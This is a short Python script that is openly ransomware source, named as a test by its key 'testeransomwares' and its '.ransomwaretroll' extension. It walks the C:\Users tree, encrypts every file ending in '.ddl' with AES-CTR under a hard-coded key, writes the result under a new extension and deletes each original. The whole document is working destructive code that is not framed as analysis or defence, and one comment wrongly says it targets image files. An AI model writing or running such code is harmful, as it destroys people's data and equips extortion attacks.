import os
import pyaes

# Define the root directory for your image files
root_directory = r"C:\Users"

# Define the encryption key
key = b"testeransomwares"

# Function to encrypt a file
def encrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        file_data = file.read()

    # Encrypt the file data using AES
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    # Create a new file with the ".ransomwaretroll" extension and write the encrypted data
    new_file_path = file_path + ".ransomwaretroll"
    with open(new_file_path, 'wb') as new_file:
        new_file.write(crypto_data)

    # Remove the original unencrypted file
    os.remove(file_path)

# Walk through the root directory and encrypt ddl files
for root, dirs, files in os.walk(root_directory):
    for file in files:
        if file.endswith('.ddl'):
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

